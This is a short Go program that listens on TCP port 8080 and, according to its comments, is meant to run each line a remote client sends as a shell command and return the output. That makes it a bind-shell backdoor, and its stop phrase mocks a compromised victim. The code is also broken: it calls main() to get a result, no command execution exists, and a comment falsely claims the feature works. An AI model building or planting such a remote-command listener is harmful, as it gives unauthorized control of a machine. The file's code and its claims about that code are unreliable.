package main

import "math/rand"
import "time"
import "net"
import "fmt"
import "bufio"
import "strings" 

func handleConnection(c net.Conn) {
	//outputs connecting IP and port
        fmt.Printf("Serving %s\n", c.RemoteAddr().String())
        for {
		//realtime input handler
                netData, err := bufio.NewReader(c).ReadString('\n')
                if err != nil {
                        fmt.Println(err)
                        return
                }
		//formalizes input to remove whitespaces leading and trailing
                temp := strings.TrimSpace(string(netData))
		//special sauce we'll use in order to break the connection cleanly
                if temp == "YES I KNOW I GOT BOOMED NOW PLEASE STOP THIS" {
                        break
                }
		//IMPORTANT***
		//Result needs to call the shell command output which will return the correct output based on the command
		result := main(temp)
                c.Write([]byte(string(result)))
        	//NOTE - has been added and should behave as expected
		//IMPORTANT***
	}
        c.Close()
}

func main() {
	
        l, err := net.Listen("tcp", ":8080")
        if err != nil {
                fmt.Println(err)
                return
        }
	//waits for the for loop to cycle out and then closes the socket
        defer l.Close()
        rand.Seed(time.Now().Unix())
	
        for {
                c, err := l.Accept()
                if err != nil {
                        fmt.Println(err)
                        return
                }
		//golang handling multiple connections 
                go handleConnection(c)
        }
  }
